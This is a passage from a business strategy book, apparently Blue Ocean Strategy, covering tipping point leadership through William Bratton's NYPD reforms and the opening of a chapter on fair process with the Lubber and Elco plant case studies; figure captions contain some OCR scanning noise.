with police\nofficers targeted at hot spots. His analysis revealed that although the\nsubway system was a maze of lines and entrances and exits, the vast\nmajority of crimes occurred at only a few stations and on a few lines. He\nalso found that these hot spots were starved for police attention even though\nthey exercised a disproportionate impact on crime performance, whereas\nlines and stations that almost never reported criminal activity were staffed\nequally. The solution was a complete refocusing of cops at subway hot\nspots to overwhelm the criminal element. And crime came tumbling down\nwhile the size of the police force remained constant.\n\nSimilarly, before Bratton’s arrival at the NYPD, the narcotics unit\nworked nine-to-five weekday-only shifts and made up less than 5 percent of\nthe department’s human resources. To search out resource hot spots, in one\nof his initial meetings with the NYPD’s chiefs, Bratton’s deputy\ncommissioner of crime strategy, Jack Maple, asked people around the table\nfor their estimates of the percentage of crimes attributable to narcotics\nusage. Most said 50 percent, others 70 percent; the lowest estimate was 30\npercent. On that basis, as Maple pointed out, it was hard to argue that a\nnarcotics unit consisting of less than 5 percent of the NYPD force was not\ngrossly understaffed. What’s more, it turned out that the narcotics squad\nlargely worked Monday to Friday, even though most drugs were sold over\nthe weekend, when drug-related crimes persistently occurred. Why? That\nwas the way it had always been; it was the unquestioned modus operandi.\n\nWhen these facts were presented and the hot spot identified, Bratton’s\ncase for a major reallocation of staff and resources within the NYPD was\nquickly accepted. Accordingly, Bratton reallocated staff and resources on\nthe hot spot, and drug crime plummeted.\n\nWhere did he get the resources to do this? He simultaneously assessed\nhis organization’s cold spots.\nRedirect Resources from Your Cold Spots\n\nLeaders need to free up resources by searching out cold spots. Again in the\nsubway, Bratton found that one of the biggest cold spots was processing\ncriminals in court. On average, it would take an officer sixteen hours to take\nsomeone downtown to process even the pettiest of crimes. This was time\nofficers were not patrolling the subway and adding value.\n\nBratton changed all that. Instead of bringing criminals to the court, he\nbrought processing centers to the criminals by using “bust buses’”—roving\nold buses retrofitted into miniature police stations that were parked outside\nsubway stations. Now instead of dragging a suspect down to the courthouse\nacross town, a police officer needed only to escort the suspect up to street\nlevel to the bus. This cut processing time from sixteen hours to just one,\nfreeing more officers to patrol the subway and catch criminals.\nEngage in Horse Trading\n\nIn addition to internally refocusing the resources a unit already controls,\ntipping point leaders skillfully trade resources they don’t need for those of\nothers that they do need. Consider again the case of Bratton. The chiefs of\npublic-sector organizations know that the size of their budgets and the\nnumber of people they control are often hotly debated because public-sector\nresources are notoriously limited. This makes chiefs of public-sector\norganizations unwilling to advertise excess resources, let alone release them\nfor use by other parts of the larger organization, because that would risk a\nloss of control over those resources. One result is that over time, some\norganizations become well endowed with resources they don’t need even\nwhile they are short of ones they do need.\n\nOn taking over as chief of the New York Transit Police, Bratton’s general\ncounsel and policy adviser, Dean Esserman (now police chief of New\nHaven, Connecticut), played a key horse trading role. Esserman discovered\nthat the Transit unit, which was starved for office space, had been running a\nfleet of unmarked cars in excess of its needs. The New York Division of\nParole, on the other hand, was short of cars but had excess office space.\nEsserman and Bratton offered the obvious trade, which was gratefully\naccepted by the parole officials. For their part, Transit unit officers were\ndelighted to get the first floor of a prime downtown building. The deal\nstoked Bratton’s credibility within the organization, something that later\nmade it easier for him to introduce more fundamental changes. At the same\ntime, it marked him to his political bosses as a man who could solve\nproblems.\n\nFigure 7-2 illustrates how radically Bratton refocused the Transit Police\ndepartment’s resources to break out of the red ocean and execute its blue\nocean strategy. The vertical axis here shows the relative level of resource\nallocation, and the horizontal axis shows the various elements of strategy in\nwhich the investments were made. By deemphasizing or virtually\neliminating some traditional features of Transit police work while increasing\nemphasis on the others or creating new ones, Bratton achieved a dramatic\nshift in resource allocation.\nFIGURE 7-2\n\nThe strategy canvas of Transit: How Bratton refocused resources\n\nHigh\na ۹ After Bratton’s appointment\n一\n斯 5R Ae Before Bratton’s appointment\nLow\nWidespread Arrests of Focus on Use of “bust\npatrols of warrant violators quality-of-life buses” for\nsubway system in daytime crimes processing\narrests\nInvolvement Issuance of desk Group Arrests Train\nof officers in appearance tickets arrests of warrant sweeps\nprocessing (which violators violators during for safe\narrests had routinely sleeping hours atmosphere\n\nignored)\n\nWhereas the actions of eliminating and reducing cut the costs for the\norganization, raising certain elements or creating new ones required added\ninvestments. As you can see on the strategy canvas, however, the overall\ninvestment of resources remained more or less constant. At the same time,\nthe value to citizens went way up. Eliminating the practice of widespread\ncoverage of the subway system and replacing it with a targeted strategy on\nhot spots enabled the Transit police to combat subway crimes more\nefficiently and effectively. Reducing the involvement of officers in\n\nprocessing arrests or cold spots and creating bust buses significantly raised\nthe value of the police force by allowing officers to concentrate their time\nand attention on policing the subway. Raising the level of investment in\ncombating quality-of-life crimes rather than big crimes refocused the police\nresources on crimes that presented constant dangers to citizens’ daily lives.\nThrough these moves, the New York Transit Police significantly enhanced\nthe performance of its officers, who were now largely freed from\nadministrative hassles and assigned clear duties as to what kinds of crimes\nthey should focus on and where to combat them.\n\nAre you allocating resources based on old assumptions, or do you seek out\nand concentrate resources on hot spots? Where are your hot spots? What\nactivities have the greatest performance impact but are resource starved?\nWhere are your cold spots? What activities are resource oversupplied but\nhave scant performance impact? Do you have a horse trader, and what can\nyou trade?\nJump the Motivational Hurdle\n\nTo reach your organization’s tipping point and execute blue ocean strategy,\nyou must alert employees to the need for a strategic shift and identify how it\ncan be achieved with limited resources. For a new strategy to become a\nmovement, people must not only recognize what needs to be done, but they\nmust also act on that insight in a sustained and meaningful way.\n\nHow can you motivate the mass of employees fast and at low cost? When\nmost business leaders want to break from the status quo and transform their\norganizations, they issue grand strategic visions and turn to massive top-\ndown mobilization initiatives. They act on the assumption that to create\nmassive reactions, proportionately massive actions are required. But this is\noften a cumbersome, expensive, and time-consuming process, given the\nwide variety of motivational needs in most large companies. And\noverarching strategic visions often inspire lip service instead of the intended\naction. It would be easier to turn an aircraft carrier around in a bathtub.\n\nOr is there another way? Instead of diffusing change efforts widely,\ntipping point leaders follow a reverse course and seek massive\nconcentration. They focus on three factors of disproportionate influence in\nmotivating employees, what we call kingpins, fishbowl management, and\natomization.\nZoom In on Kingpins\n\nFor strategic change to have real impact, employees at every level must\nmove en masse. To trigger an epidemic movement of positive energy,\nhowever, you should not spread your efforts thin. Rather, you should\nconcentrate your efforts on kingpins, the key influencers in the organization.\nThese are people inside the organization who are natural leaders, who are\nwell respected and persuasive, or who have an ability to unlock or block\naccess to key resources. As with kingpins in bowling, when you hit them\nstraight on, all the other pins come toppling down. This frees an\norganization from tackling everyone, and yet in the end everyone is touched\nand changed. And because in most organizations there are a relatively small\nnumber of key influencers, who tend to share common problems and\nconcerns, it is relatively easy for the CEO to identify and motivate them.\n\nAt the NYPD, for example, Bratton zoomed in on the seventy-six\nprecinct heads at the time as his key influencers and kingpins. Why? Each\nprecinct head directly controlled two hundred to four hundred police\nofficers. Hence, galvanizing these seventy-six heads would have the natural\nripple effect of touching and motivating the thirty-six-thousand-deep police\nforce to embrace the new policing strategy.\nPlace Kingpins in a Fishbowl\n\nAt the heart of motivating the kingpins in a sustained and meaningful way\n\nis shining a spotlight on their actions in a repeated and highly visible way.\nThis is what we refer to as fishbow/ management, where kingpins’ actions\nand inaction are made as transparent to others as are fish in a bowl of water.\nBy placing kingpins in a fishbowl] in this way, you greatly raise the stakes of\ninaction. Light is shined on who is lagging behind, and a fair stage is set for\nrapid change agents to shine. For fishbowl management to work, it must be\nbased on transparency, inclusion, and fair process.\n\nAt the NYPD, Bratton’s fishbowl was a biweekly crime strategy review\nmeeting known as Compstat that brought together the city’s top brass to\nreview the performance of all seventy-six precinct commanders in\nexecuting its new strategy. Attendance was mandatory for all precinct\ncommanders; three-star chiefs, deputy commissioners, and borough chiefs\nwere also required to attend. Bratton himself was there as often as possible.\nAs each precinct commander was questioned on decreases and increases in\ncrime performance in front of peers and superiors based on the\norganization’s new strategic directives, enormous computer-generated\noverhead maps and charts were shown, visually illustrating in inescapable\nterms the commander’s performance in executing the new strategy. The\ncommander was responsible for explaining the maps, describing how his or\nher officers were addressing the issues, and outlining why performance was\ngoing up or down. These inclusive meetings instantly made results and\nresponsibilities clear and transparent for everyone.\n\nAs a result, an intense performance culture was created in weeks—forget\nabout months, let alone years—because no kingpin wanted to be shamed in\nfront of others, and they all wanted to shine in front of their peers and\nsuperiors. In the fishbowl, incompetent precinct commanders could no\nlonger cover up their failings by blaming their precinct’s results on the\nshortcomings of neighboring precincts because their neighbors were in the\nroom and could respond. Indeed, a picture of the precinct commander to be\ngrilled at the crime strategy meetings was printed on the front page of the\nhandout, emphasizing that the commander was responsible and accountable\nfor that precinct’s results.\nBy the same token, the fishbowl gave an opportunity for high achievers\nto gain recognition for work in their own precincts and in helping others.\nThe meetings also provided an opportunity for policy leaders to compare\nnotes on their experiences; before Bratton’s arrival, precinct commanders\nseldom got together as a group. Over time, this style of fishbowl\nmanagement filtered down the ranks, as the precinct commanders tried out\ntheir own versions of Bratton’s meetings. With the spotlight shining brightly\non their performance in strategy execution, the precinct commanders were\nhighly motivated to get all the officers under their control marching to the\nnew strategy.\n\nFor this to work, however, organizations must simultaneously make fair\nprocess the modus operandi. By fair process we mean engaging all the\naffected people in the process, explaining to them the basis of decisions and\nthe reasons people will be promoted or sidestepped in the future, and setting\nclear expectations of what that means to employees’ performance. At the\nNYPD’s crime strategy review meetings, no one could argue that the\nplaying field wasn’t fair. The fishbowl was applied to all kingpins. There\nwas clear transparency in the assessment of every commander’s\nperformance and how it would tie into advancement or demotion, and clear\nexpectations were set in every meeting of what was expected in\nperformance from everyone.\n\nIn this way, fair process signals to people that there is a level playing\nfield and that leaders value employees’ intellectual and emotional worth\ndespite all the change that may be required. This greatly mitigates feelings\nof suspicion and doubt that are almost necessarily present in employees’\nminds when a company is trying to make a major strategic shift. The\ncushion of support provided by fair process, combined with the fishbowl\nemphasis on sheer performance, pushes people and supports them on the\njourney, demonstrating managers’ intellectual and emotional respect for\nemployees. (For a fuller discussion on fair process and its motivational\nimplications, see chapter 8.)\nAtomize to Get the Organization to Change Itself\n\nThe last disproportionate influence factor is atomization. Atomization\nrelates to the framing of the strategic challenge—one of the most subtle and\nsensitive tasks of the tipping point leader. Unless people believe that the\nstrategic challenge is attainable, the change is not likely to succeed. On the\nface of it, Bratton’s goal in New York City was so ambitious as to be\nscarcely believable. Who could believe that anything an individual could do\nwould turn such a huge city from being the most dangerous place in the\ncountry into the safest? And who would want to invest time and energy in\nchasing an impossible dream?\n\nTo make the challenge attainable, Bratton broke it into bite-size atoms\nthat officers at different levels could relate to. As he put it, the challenge\nfacing the NYPD was to make the streets of New York City safe “block by\nblock, precinct by precinct, and borough by borough.” Thus framed, the\nchallenge was both all-encompassing and doable. For officers on the street,\nthe challenge was to make their beat or block safe—no more. For the\nprecinct commanders, the challenge was to make their precinct safe—no\nmore. Borough heads also had a concrete goal within their capabilities:\nmaking their boroughs safe—no more. No one could say that what was\nbeing asked of them was too tough. Nor could they claim that achieving it\nwas largely out of their hands—“It’s beyond me.” In this way, responsibility\nfor executing Bratton’s blue ocean strategy shifted from him to each of the\nNYPD’s thirty-six thousand officers.\n\nDo you indiscriminately try to motivate the masses? Or do you focus on\nkey influencers, your kingpins? Do you put the spotlight on and manage\nkingpins in a fishbowl based on fair process? Or do you just demand high\nperformance and cross your fingers until the next quarter numbers come\nout? Do you issue grand strategic visions? Or do you atomize the issue to\nmake it actionable to all levels?\nKnock Over the Political Hurdle\n\nYouth and skill will win out every time over age and treachery. True or\nfalse? False. Even the best and brightest are regularly eaten alive by\npolitics, intrigue, and plotting. Organizational politics is an inescapable\nreality of corporate and public life. Even if an organization has reached the\ntipping point of execution, there exist powerful vested interests that will\nresist the impending changes. (Also see our discussion on adoption hurdles\nin chapter 6.) The more likely change becomes, the more fiercely and\nvocally these negative influencers—both internal and external—will fight\nto protect their positions, and their resistance can seriously damage and\neven derail the strategy execution process. To overcome these political\nforces, tipping point leaders focus on three disproportionate influence\nfactors: leveraging angels, silencing devils, and getting a consigliere on\ntheir top management team. Angels are those who have the most to gain\nfrom the strategic shift. Devils are those who have the most to lose from it.\nAnd a consigliere is a politically adept but highly respected insider who\nknows in advance all the land mines, including who will fight you and who\nwill support you.\nSecure a Consigliere on Your Top Management Team\n\nMost leaders concentrate on building a top management team having strong\nfunctional skills such as marketing, operations, and finance—and that is\nimportant. Tipping point leaders, however, also engage one role few other\nexecutives think to include: a consigliere. To that end, Bratton, for example,\nalways ensured that he had a respected senior insider on his top team who\nknew the land mines he would face in implementing the new policing\nstrategy. At NYPD, Bratton appointed John Timoney as his number two.\nTimoney was a cop’s cop, respected and feared for his dedication to the\nNYPD and for the more than sixty decorations and combat crosses he had\nreceived. Twenty years in the ranks had taught him not only who all the key\nplayers were but also how they played the political game. One of the first\ntasks Timoney did was to report to Bratton on the likely attitudes of the top\nstaff to the NYPD’s new policing strategy, identifying those who would\nfight or silently sabotage the new initiative. This led to a dramatic changing\nof the guard.\nLeverage Your Angels and Silence Your Devils\n\nTo knock down the political hurdles, you should also ask yourself two sets\nof questions:\n\n* Who are my devils? Who will fight me? Who will lose the most by the\nfuture blue ocean strategy?\n\n¢ Who are my angels? Who will naturally align with me? Who will gain\nthe most by the strategic shift?\n\nDon’t fight alone. Get the higher and wider voice to fight with you.\nIdentify your detractors and supporters—forget the middle—and strive to\ncreate a win-win outcome for both. But move quickly. Isolate your\ndetractors by building a broader coalition with your angels before a battle\nbegins. In this way, you will discourage the war before it has a chance to\nstart or gain steam.\n\nOne of the most serious threats to Bratton’s new policing strategy came\nfrom New York City’s courts. Believing that Bratton’s new policing strategy\nof focusing on quality-of-life crimes would overwhelm the system with\nsmall crime cases such as prostitution and public drunkenness, the courts\nopposed the strategic shift. To overcome this opposition, Bratton clearly\nillustrated to his supporters, including the mayor, district attorneys, and jail\nmanagers, that the court system could indeed handle the added quality-of-\nlife crimes and that focusing on them would, in the long term, actually\nreduce their caseload. The mayor decided to intervene.\n\nThen Bratton’s coalition, led by the mayor, went on the offensive in the\npress with a clear and simple message: if the courts did not pull their\nweight, the city’s crime rate would not go down. Bratton’s alliance with the\nmayor’s office and the city’s leading newspaper successfully isolated the\ncourts. They could hardly be seen to publicly oppose an initiative that\nwould not only make New York a more attractive place to live but would\nalso ultimately reduce the number of cases brought before them. With the\nmayor speaking aggressively in the press of the need to pursue quality-of-\nlife crimes and the city’s most respected—and liberal—newspaper giving\ncredence to the new police strategy, the costs of fighting Bratton’s strategy\nwere daunting. Bratton had won the battle: the courts would comply. He\nalso won the war: crime rates did indeed come down.\n\nKey to winning over your detractors or devils is knowing all their likely\nangles of attack and building up counterarguments backed by irrefutable\nfacts and reason. For example, when the NYPD’s precinct commanders\nwere first requested to compile detailed crime data and maps, they balked at\nthe idea, arguing that it would take too much time. Anticipating this\nreaction, Bratton had already done a test run of the operation to see how\nlong it would take: no more than eighteen minutes a day, which worked out,\nas he told the commanders, to less than 1 percent of their average workload.\nArmed with irrefutable information, he was able to tip the political hurdle\nand win the battle before it even began.\n\nDo you have a consigliere—a highly respected insider—in your top\nmanagement team, or only a CFO and other functional heads? Do you know\nwho will fight you and who will align with the new strategy? Have you\nbuilt coalitions with natural allies to encircle dissidents? Do you have your\nconsigliere remove the biggest land mines so that you don’t have to focus\non changing those who cannot and will not change?\nChallenging Conventional Wisdom\n\nFigure 7-3 depicts the gist of how tipping point leadership works. As shown,\nthe conventional theory of organizational change rests on transforming the\nmass. So change efforts are focused on moving the mass, requiring steep\nresources and long time frames—luxuries few executives can afford. Tipping\npoint leadership, by contrast, takes a reverse course. To change the mass, it\nfocuses on transforming the extremes: the people, acts, and activities that\nexercise a disproportionate influence on performance. By transforming the\nextremes, tipping point leaders are able to change the core fast and at low\ncost to execute their new strategy.\n\nFIGURE 7-3\n\nConventional wisdom versus tipping point leadership\n\nConventional wisdom\n\n什\n\nMass of employees\n\nCompany\nTheory of organization change rests on transforming the mass. So change efforts\nare focused on moving the mass, requiring steep resources and long time frames.\n\nTipping point leadership\n\nExtremes\n\nCompany\nTo change the mass, focus on the extremes—people, acts, and activities that exercise\na disproportionate influence on performance to achieve a strategic shift fast at low cost.\n\nIt is never easy to execute a strategic shift, and doing it fast with limited\nresources is even more difficult. Yet our research suggests that it can be\nachieved by leveraging tipping point leadership. By consciously addressing\nthe hurdles to strategy execution and focusing on factors of disproportionate\ninfluence, you too can knock them over to actualize a strategic shift. Don’t\nfollow conventional wisdom. Not every challenge requires a proportionate\naction. Focus on acts of disproportionate influence. This is a critical\nleadership component for making blue ocean strategy happen.\n\nThe next chapter drills down one level further. It addresses the challenge\nof mobilizing people’s minds and hearts for the new strategy by building a\nculture of trust, commitment, and voluntary cooperation in its execution, as\nwell as support for the leader.\nCHAPTER 8\n\nBuild Execution into Strategy\n\nA COMPANY IS NOT ONLY TOP MANAGEMENT, nor is it only middle\nmanagement. A company is everyone from the top to the front lines. And it\nis only when all the members of an organization are motivated to support a\nstrategy, for better or for worse, that a company stands apart as a great and\nconsistent executor. Overcoming the organizational hurdles to strategy\nexecution is an important step toward that end. It removes the roadblocks\nthat can put a halt to even the best of strategies.\n\nBut in the end, a company needs to invoke the most fundamental base of\naction: the attitudes and behavior of its people deep in the organization. You\nmust create a culture of trust and commitment that motivates people to\nexecute the agreed strategy—not to the letter, but to the spirit. People’s\nminds and hearts must align with the new strategy so that at the level of the\nindividual, people embrace it of their own accord and willingly go beyond\ncompulsory execution to voluntary cooperation in carrying it out.\n\nWhere blue ocean strategy is concerned, this challenge is heightened.\nTrepidation builds as people are required to step out of their comfort zones\nand change how they have worked in the past. They wonder, what are the\nreal reasons for this change? Is top management honest when it speaks of\nbuilding future growth through a change in strategic course? Or are they\ntrying to make us redundant and work us out of our jobs?\n\nThe more removed people are from the top and the less they have been\ninvolved in the creation of the strategy, the more this trepidation builds. On\nthe front line, at the very level at which a strategy must be executed day in\nand day out, people can resent having a strategy thrust upon them with little\nregard for what they think and feel. Just when you think you have done\neverything right, things can suddenly go very wrong on your front line.\n\nThis brings us to the sixth principle of blue ocean strategy: to build\npeople’s trust and commitment deep in the ranks and inspire their voluntary\ncooperation, companies need to build execution into strategy from the start.\nThat principle allows companies to minimize the management risk of\ndistrust, noncooperation, and even sabotage. This management risk is\nrelevant to strategy execution in both red and blue oceans, but it is greater\nfor blue ocean strategy because its execution often requires significant\nchange. Hence, minimizing such risk is essential as companies execute blue\nocean strategy. Companies must reach beyond the usual suspects of carrots\nand sticks. They must reach to fair process in the making and executing of\nstrategy.\n\nOur research shows that fair process is a key variable that distinguishes\nsuccessful blue ocean strategic moves from those that failed. The presence\nor absence of fair process can make or break a company’s best execution\nefforts.\nPoor Process Can Ruin Strategy Execution\n\nConsider the experience of a global leader in supplying water-based liquid\ncoolants for metalworking industries. ۷۰۰۱۱ call this organization Lubber.\nBecause of the many processing parameters in metal-based manufacturing,\nthere are several hundred complex types of coolants to choose from.\nChoosing the right coolant is a delicate process. Products must first be\ntested on production machines before purchasing, and the decision often\nrests on fuzzy logic. The result is machine downtime and sampling costs,\nand these are expensive for customers and Lubber alike.\n\nTo offer customers a leap in value, Lubber devised a strategy to eliminate\nthe complexity and costs of the trial phase. Using artificial intelligence, it\ndeveloped an expert system that cut the failure rate in selecting coolants to\nless than 10 percent from an industry average of 50 percent. The system\nalso reduced machine downtime, eased coolant management, and raised the\noverall quality of work pieces produced. As for Lubber, the sales process\nwas dramatically simplified, giving sales representatives more time to gain\nnew sales and dropping the costs per sale.\n\nThis win-win value innovation strategic move, however, was doomed\nfrom the start. It wasn’t that the strategy was not good or that the expert\nsystem did not work; it worked exceptionally well. The strategy was\ndoomed because the sales force fought it.\n\nHaving not been engaged in the strategy-making process nor apprised of\nthe rationale for the strategic shift, sales reps saw the expert system in a\nlight no one on the design team or management team had ever imagined. To\nthem, it was a direct threat to what they saw as their most valuable\ncontribution—tinkering in the trial phase to find the right water-based\ncoolant from the long list of possible candidates. All the wonderful benefits\n—having a way to avoid the hassle-filled part of their job, having more time\nto pull in more sales, and winning more contracts by standing out in the\nindustry—went unappreciated.\n\nWith the sales force feeling threatened and often working against the\nexpert system by expressing doubts about its effectiveness to customers,\nsales did not take off. After cursing its hubris and learning the hard way the\nimportance of dealing with managerial risk up front based on the proper\nprocess, management was forced to pull the expert system from the market\nand work on rebuilding trust with its sales representatives.\nThe Power of Fair Process\n\nWhat, then, is fair process? And how does it allow companies to build\nexecution into strategy? The theme of fairness or justice has preoccupied\nwriters and philosophers throughout the ages. But the direct theoretical\norigin of fair process traces back to two social scientists: John W. Thibaut\nand Laurens Walker. In the mid-1970s, they combined their interest in the\npsychology of justice with the study of process, creating the term\nprocedural justice. Focusing their attention on legal settings, they sought\nto understand what makes people trust a legal system so that they will\ncomply with laws without being coerced. Their research established that\npeople care as much about the justice of the process through which an\noutcome is produced as they do about the outcome itself. People’s\nsatisfaction with the outcome and their commitment to it rose when\nprocedural justice was exercised.”\n\nFair process is our managerial expression of procedural justice theory. As\nin legal settings, fair process builds execution into strategy by creating\npeople’s buy-in up front. When fair process is exercised in the strategy-\nmaking process, people trust that a level playing field exists. This inspires\nthem to cooperate voluntarily in executing the resulting strategic decisions.\n\nVoluntary cooperation is more than mechanical execution, where people\ndo only what it takes to get by. It involves going beyond the call of duty,\nwherein individuals exert energy and initiative to the best of their abilities\n—even subordinating personal self-interest—to execute resulting\nstrategies.> Figure 8-1 presents the causal flow we observed among fair\nprocess, attitudes, and behavior.\n\nFIGURE 8-1\n\nHow fair process affects people’s attitudes and behavior\nFair process\n\nEngagement\nExplanation\nExpectation clarity\n\nTrust and\ncommitment\n\n“I feel my\nopinion counts.”\n\nVoluntary\ncooperation\n\n“I'll go beyond\nthe call of duty.”\n\nExceeds\nexpectations\n\nSelf-initiated\n\nStrategy\nformulation\nprocess\n\nAttitudes\n\nBehavior\n\nStrategy\nexecution\n\nThe Three E Principles of Fair Process\n\nThere are three mutually reinforcing elements that define fair process:\nengagement, explanation, and clarity of expectation.* Whether people are\nsenior executives or shop floor employees, they all look to these elements.\nWe call them the three E principles of fair process.\n\nEngagement means involving individuals in the strategic decisions that\naffect them by asking for their input and allowing them to refute the merits\nof one another’s ideas and assumptions. Engagement communicates\nmanagement’s respect for individuals and their ideas. Encouraging\nrefutation sharpens everyone’s thinking and builds better collective wisdom.\nEngagement results in better strategic decisions by management and greater\ncommitment from all involved to execute those decisions.\n\nExplanation means that everyone involved and affected should\nunderstand why final strategic decisions are made as they are. An\nexplanation of the thinking that underlies decisions makes people confident\nthat managers have considered their opinions and have made decisions\nimpartially in the overall interests of the company. An explanation allows\nemployees to trust managers’ intentions even if their own ideas have been\nrejected. It also serves as a powerful feedback loop that enhances learning.\n\nExpectation clarity requires that after a strategy is set, managers state\nclearly the new rules of the game. Although the expectations may be\ndemanding, employees should know up front what standards they will be\njudged by and the penalties for failure. What are the goals of the new\nstrategy? What are the new targets and milestones? Who is responsible for\nwhat? To achieve fair process, it matters less what the new goals,\nexpectations, and responsibilities are and more that they are clearly\nunderstood. When people understand what is expected of them, political\njockeying and favoritism are minimized, and people can focus on executing\nthe strategy rapidly.\n\nTaken together, these three criteria collectively lead to judgments of fair\nprocess. This is important, because any subset of the three does not create\njudgments of fair process.\nA Tale of Two Plants\n\nHow do the three E principles of fair process work to affect strategy\nexecution deep in an organization? Consider the experience of an elevator\nsystems manufacturer we’ll call Elco that was in transition. At the time,\nsales in the elevator industry were in steady decline, as excess office space\nleft some large US cities with vacancy rates as high as 20 percent.\n\nWith domestic demand falling, Elco set out to offer buyers a leap in value\nwhile lowering its costs to stimulate new demand and break from the\ncompetition. In its quest to create and execute a blue ocean strategy, the\ncompany realized that it needed to replace its batch-manufacturing system\nwith a cellular approach that would allow self-directed teams to achieve\nsuperior performance. The management team was in agreement and ready\nto go. To execute this key element of its strategy, the team adopted what\nlooked like the fastest and smartest way to move forward.\n\nIt would first install the new system at Elco’s Chester plant and then roll\nit out to its second plant, High Park. The logic was simple. The Chester\nplant had exemplary employee relations, so much so that the workers had\ndecertified their own union. Management was certain it could count on\nemployee cooperation to execute the strategic shift in manufacturing. In the\ncompany’s words, “They were the ideal workforce.” Next, Elco would roll\nout the process to its plant in High Park, where a strong union was expected\nto resist that, or any other, change. Management was counting on having\nachieved a degree of momentum for execution at Chester that it hoped\nwould have positive spillover effects on High Park.\n\nThe theory was good. In practice, however, things took an unpredicted\nturn. The introduction of the new manufacturing process at the Chester\nplant quickly led to disorder and rebellion. Within a few months, both cost\nand quality performance were in free fall. Employees were talking about\nbringing back the union. Having lost control, the despairing plant manager\ncalled Elco’s industrial psychologist for help.\n\nIn contrast, the High Park plant, despite its reputation for resistance, had\naccepted the strategic shift in the manufacturing process. Every day, the\nHigh Park manager waited for the anticipated meltdown, but it never came.\nEven when people didn’t like the decisions, they felt they had been treated\nfairly, and so they willingly participated in the rapid execution of the new\nmanufacturing process, a pivotal component of the company’s new strategy.\n\nA closer look at the way the strategic shift was made at the two plants\nreveals the reasons behind this apparent anomaly. At the Chester plant, Elco\nmanagers violated all three of the basic principles of fair process. First, they\nfailed to engage employees in the strategic decisions that directly affected\nthem. Lacking expertise in cellular manufacturing, Elco brought in a\nconsulting firm to design a master plan for the conversion. The consultants\nwere briefed to work quickly and with minimal disturbance to employees so\nthat fast, painless implementation could be achieved. The consultants\nfollowed the instructions. When Chester employees arrived at work they\ndiscovered strangers at the plant who not only dressed differently—wearing\nformal business attire—but also spoke in low tones to one another. To\nminimize disturbance, they didn’t interact with employees. Instead they\nquietly hovered behind people’s backs, taking notes and drawing diagrams.\nThe rumor circulated that after employees went home in the afternoon,\nthese same people would swarm across the plant floor, snoop around\npeople’s workstations, and have heated discussions.\n\nDuring this period, the plant manager was increasingly absent. He was\nspending more time at Elco’s head office in meetings with the consultants—\nsessions deliberately scheduled away from the plant so as not to distract the\nemployees. But the plant manager’s absence produced the opposite effect.\nAs people grew anxious, wondering why the captain of their ship seemed to\nbe deserting them, the rumor mill moved into high gear. Everyone became\nconvinced that the consultants would downsize the plant. They were sure\nthey were about to lose their jobs. The fact that the plant manager was\nalways gone without any explanation—obviously, he was avoiding them—\ncould only mean that management was, they thought, “trying to put one\nover on us.” Trust and commitment at the Chester plant deteriorated\nquickly.\n\nSoon, people were bringing in newspaper clippings about other plants\naround the country that had been shut down with the help of consultants.\nEmployees saw themselves as imminent victims of management’s hidden\nintention to downsize and work people out of their jobs. In fact, Elco\nmanagers had no intention of closing the plant. They wanted to cut waste,\nfreeing people to produce higher-quality elevators faster at lower cost to\nleapfrog the competition. But plant employees could not have known that.\n\nManagers at Chester also didn’t explain why strategic decisions were\nbeing made the way they were and what those decisions meant to\nemployees’ careers and work methods. Management unveiled the master\nplan for change in a thirty-minute session with employees.\n\nThe audience heard that their time-honored way of working would be\nabolished and replaced by something called “cellular manufacturing.” No\none explained why the strategic shift was needed, how the company needed\nto break away from the competition to stimulate new demand, and why the\nshift in the manufacturing process was a key element of that strategy.\nEmployees sat in stunned silence, with no understanding of the rationale\nbehind the change. The managers mistook this for acceptance, forgetting\nhow long it had taken them over the preceding few months to get\ncomfortable with the idea of shifting to cellular manufacturing to execute\nthe new strategy.\n\nMaster plan in hand, management quickly began rearranging the plant.\nWhen employees asked what the new layout aimed to achieve, the response\nwas “efficiency gains.” The managers didn’t have time to explain why\nefficiency had to be improved and didn’t want to worry employees. But\nlacking an intellectual understanding of what was happening to them, some\nemployees began feeling sick as they came to work.\n\nManagers also neglected to make clear what would be expected of\nemployees under the new manufacturing process. They informed employees\nthat they would no longer be judged on individual performance but rather\non the performance of the cell. They said that faster or more experienced\nemployees would have to pick up the slack for slower or less experienced\ncolleagues. But they didn’t elaborate. How the new cellular system was\nsupposed to work, managers didn’t make clear.\n\nViolations of the principles of fair process undermined employees’ trust\nin the strategic shift and in management. In fact, the new cell design offered\ntremendous benefits to employees—for example, making vacations easier\nto schedule and giving them the opportunity to broaden their skills and\nengage in a greater variety of work. Yet employees could see only its\nnegative side. They began taking out their fear and anger on one another.\nFights erupted on the plant floor as employees refused to help those they\ncalled “lazy people who can’t finish their own jobs” or interpreted offers of\nhelp as meddling, responding with, “This is my job. You keep to your own\nworkstation.”\n\nChester’s model workforce was falling apart. For the first time in the\nplant manager’s career, employees refused to do as they were asked, turning\ndown assignments “even if you fire me.” They felt they could no longer\ntrust the once popular plant manager, so they began to go around him,\ntaking their complaints directly to his boss at the head office. In the absence\nof fair process, the Chester plant’s employees rejected the transformation\nand refused to play their role in executing the new strategy.\n\nIn contrast, management at the High Park plant abided by all three\nprinciples of fair process when introducing the strategic shift. When the\nconsultants came to the plant, the plant manager introduced them to all\nemployees. Management engaged employees by holding a series of\nplantwide meetings, where corporate executives openly discussed the\ndeclining business conditions and the company’s need for a change in\nstrategic course to break from the competition and simultaneously achieve\nhigher value at lower cost. They explained that they had visited other\ncompanies’ plants and had seen the productivity improvements that cellular\nmanufacturing could bring. They explained how this would be a pivotal\ndeterminant of the company’s ability to achieve its new strategy. They\nannounced a proaction-time policy to calm employees’ justifiable fears of\nlayoffs. As old performance measures were discarded, managers worked\nwith employees to develop new ones and to establish each cell team’s new\nresponsibilities. Goals and expectations were made clear to employees.\n\nBy practicing the three principles of fair process in tandem, management\nwon the understanding and support of High Park employees. The\nemployees spoke of their plant manager with admiration, and they\ncommiserated with the difficulties Elco’s managers had in executing the\nnew strategy and making the changeover to cellular manufacturing. They\nconcluded that it had been a necessary, worthwhile, and positive experience.\n\nElco’s managers still regard this experience as one of the most painful in\ntheir careers. They learned that people in the front line care as much about\nthe proper process as those at the top. By violating fair process in making\nand rolling out strategies, managers can turn their best employees into their\nworst, earning their distrust of and resistance to the very strategy they\ndepend on them to execute. But if managers practice fair process, the worst\nemployees can 0011) into the best and can execute even difficult strategic\nshifts with their willing commitment while building their trust.\nWhy Does Fair Process Matter?\n\nWhy is fair process important in shaping people’s attitudes and behavior?\nSpecifically, why does the observance or violation of fair process in\nstrategy making have the power to make or break a strategy’s execution? 